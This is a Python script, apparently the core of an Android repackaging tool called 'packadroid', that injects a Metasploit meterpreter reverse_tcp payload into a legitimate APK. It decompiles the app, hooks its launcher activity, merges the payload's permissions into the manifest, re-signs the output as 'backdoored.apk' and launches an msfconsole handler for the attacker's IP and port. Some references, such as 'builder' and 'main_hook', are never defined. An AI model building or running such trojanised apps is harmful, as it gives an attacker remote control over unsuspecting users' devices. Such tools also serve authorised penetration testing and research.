import subprocess
import argparse
import sys
import errno
import os
import shutil
import time
import xml.etree.ElementTree as ET

from packadroid.apkhandling import packer
from packadroid.manifestmanager import manifest_analyzer, manifest_changer
from packadroid.hookmanager import activity_hook, broadcast_hook
from packadroid.interactive_shell.prompt import PackadroidPrompt

# tasks:
# - write/include argument parser
#   -> path to original apk             -o or --original
#   -> path to output dir               -out or --output
#   -> path to malware apk              -malware
#   -> or autogenerate meterpreter      -generate
#       -> parse given arguments for metasploit
#
#
# - check if jarsigner is installed
# - check if apktool is installed
# - check if metapsloit is installed but only if metasploit is also needed
# - method that generats metasploit payload
# - method that decompiles given apk
# - method that manipulates the manifest
# - method that injects the call to the malware into the original smali code
#   -> in future the starting point of the malware should be determined dynamic or given per parameters
#   -> think of different ways to launch the malware
# - method that copies malware smali into original smali files 
# - method that builds the apk again
# - method that signs the apk

# global dictonary for the arguments
args = {}


def parseArgs():
    global args
    parser = argparse.ArgumentParser(description="")
    parser.add_argument("-b", "--batch", action="store", dest="batch", default=None)
    parser.add_argument("-o", "--original", action="store", dest="original_apk", default="")
    parser.add_argument("-m", "--malware", action="store", dest="malware_apk", default="")
    parser.add_argument("-out", "--output", action="store", dest="output_dir", default="")
    parser.add_argument("--meterpreter_ip", action="store", dest="meterpreter_ip", default="")
    parser.add_argument("--meterpreter_port", action="store", dest="meterpreter_port", default="")
    parser.add_argument("--broadcast_hook", action="store_true", dest="broadcast_hook", default=False)
    parser.add_argument("--noclean", action="store_false", dest="clean", default=True)
    args_parsed = parser.parse_args(sys.argv[1:])

    # convert to dictonary
    args = vars(args_parsed)

    if args['meterpreter_port'] == "" or args['meterpreter_ip'] == "":
        args['metasploit_used'] = False
    else:
        args['metasploit_used'] = True
        # always android reverse shell and alway same output file
        args['meterpreter_arguments'] = "-p android/meterpreter/reverse_tcp LHOST=" + str(args['meterpreter_ip']) + \
                                        " LPORT=" + str(args['meterpreter_port']) + " -o payload.apk"

def mkdir_p(path):
    """
        make directories and accepts that a directory may be already there.
        Legacy function for Python < 3.5
        :param path: - to be created
    """
    try:
        os.makedirs(path)
    except OSError as exc:  # Python >2.5
        if exc.errno == errno.EEXIST and os.path.isdir(path):
            pass
        else:
            raise

# checks if a given program is installed on the computer
# Returns True or False
def isInstalled(program):
    proc = subprocess.Popen(["which " + program], stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    return out != ""


def generate_meterpreter(command):
    """ executes meterpreter with the options 
        given in the 'command' argument """
    proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()

    if "invalid" in out.lower() or \
            "error" in out.lower():
        print(out)
        sys.exit(1)

def start_meterpreter_handler():
    with open("meterpreter_options.txt", "w") as f:
        f.write("use exploit/multi/handler\n")
        f.write("set payload android/meterpreter/reverse_tcp\n")
        f.write("set lhost " + args['meterpreter_ip'] + "\n")
        f.write("set lport " + args['meterpreter_port'] + "\n")
        f.write("exploit\n")
    
    command = "msfconsole -r meterpreter_options.txt"
    proc = subprocess.Popen(command, shell=True)
    (out, err) = proc.communicate()



def run_jarsigner(command):
    """ executes the jarsigner with specific options 
        given in the 'command' argument"""
    full_command = "jarsigner " + command
    proc = subprocess.Popen(full_command, stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    #print out
    #print err

def check_requirements():
    """
    Check for all requirements (Software, Parameters)
    """
    global args
    # check for used programs
    if args['metasploit_used']:
        if not isInstalled("msfvenom"):
            print("[!] msfvenom (metasploit) is not installed, please install it and rerun the script")
            sys.exit(1)
    if not isInstalled("apktool"):
        print("[!] apktool is not installed, please install it and rerun the script")
        sys.exit(1)
    if not isInstalled("jarsigner"):
        print("[!] jarsigner is not installed, please install it and rerun the script")
        sys.exit(1)

    if not args['metasploit_used']:
        print("metasploit is required to run application, please specify the --meterprezer_ip and --meterpreter_port in the patameters")
        sys.exit(1)
    
    if not args['original_apk']:
        print("Please specify the path to the original apk with the -o parameter")
        sys.exit(1)

def place_hooks(launcher_activity):
    global args
    """ 
        Places a hook in the main activity, and reads the 
        manifest information to a XML model.
        :param launcher_activity: The user-selecter launcher activity, (only one object)
    """
    print("[*] Launcheractivity: {} ".format(launcher_activity))

    smali_file = 'original/_decompiled/smali/{}.smali'.format(launcher_activity.replace(".", "/"))


    hookedsmali = main_hook.generate_hooked_smali(smali_file)
    print("[*] Loading ", smali_file, " and injecting payload..\n")

    with open(smali_file, "w") as f:
        f.write("\n".join(hookedsmali))

    print("[*] Poisoning the manifest with meterpreter permissions..\n")
    payload_manifest = "payload/_decompiled/AndroidManifest.xml"
    original_manifest = "original/_decompiled/AndroidManifest.xml"
    manifest_changer.fix_manifest(payload_manifest, original_manifest, original_manifest)


    # Broadcast hook
    if args['broadcast_hook']:
        # TODO make paths dynamic
        broadcast_hook.inject_broadcast_hook("original/_decompiled/AndroidManifest.xml", "original/_decompiled/smali/com/metasploit/stage/","com/metasploit/stage/" ,True, True, True, True, True, True)
        pass

def main():
    global args

    parseArgs()
    print(args)

    check_requirements()

    print("[*] Generating msfvenom payload..\n")
    command = "msfvenom " + args['meterpreter_arguments'] + " 2>&1"
    print((str(command)))
    generate_meterpreter(command)

    print("[*] Signing payload..\n")
    run_jarsigner(
        "-verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA payload.apk androiddebugkey")

    #print "[*] Copy apk to desired place..\n"
    proc = subprocess.Popen("cp " + args['original_apk'] + " original.apk", stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    #print out

    print("[*] Decompiling orignal APK..\n")
    builder.decompile_apk("original.apk")
    print("[*] Decompiling payload APK..\n")
    builder.decompile_apk("payload.apk")


    print("Exploitable activities: ")
    exploitable_activities = manifest_analyzer.find_launcher_activities('original/_decompiled/AndroidManifest.xml')
    for i in range(len(exploitable_activities)):
        print(("[{}.] {}".format(i, exploitable_activities[i])))
    print() 
    index = int(eval(input("Which activity should be hooked?")))
    launcher_activity = exploitable_activities[index]
    print(("Successfully selected {} entry point.".format(exploitable_activities[index])))

    # read the manifest to xml model
    print("Reading android manifest")

    print("[*] Launcheractivity: {} ".format(launcher_activity))

    smali_file = 'original/_decompiled/smali/{}.smali'.format(launcher_activity.replace(".", "/"))

    print(smali_file)
    time.sleep(10)

    print("[*] Copying payload files..\n")
    mkdir_p('original/_decompiled/smali/com/metasploit/stage')
    os.system('cp payload/_decompiled/smali/com/metasploit/stage/*.smali '
              'original/_decompiled/smali/com/metasploit/stage/')

    place_hooks(launcher_activity)

    #exit(1)
    injected_apk = "backdoored.apk"

    print("[*] Rebuilding")
    builder.repackApk("original/_decompiled/")

    print("[*] Signing")
    run_jarsigner(
        "-verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg "
        "MD5withRSA " + injected_apk + " androiddebugkey")

    if args['clean']:
        # clean up
        print("[*] Clean up intermediate states\n")
        shutil.rmtree('original/')
        shutil.rmtree('payload/')
        os.remove("original.apk")
        os.remove("payload.apk")

    print("[+] Infected file " + injected_apk + " ready.\n")

     
    if args['metasploit_used']:
        print("[*] Start the handler for meterpreter on IP: " + args['meterpreter_ip'] + " Port: " + args['meterpreter_port'])
        start_meterpreter_handler()

parseArgs()
prompt = PackadroidPrompt()
if args['batch'] is not None:
    cmds = []
    batch_file = args['batch']
    if not os.path.isfile(batch_file):
        print("Cannot load batch file from location {}".format(batch_file))
        sys.exit(1)
    with open(batch_file, "r") as f:
        cmds = f.readlines()
    # Execute the commands given in the batch file first!
    prompt.execute_commands(cmds)
prompt.start()
main()
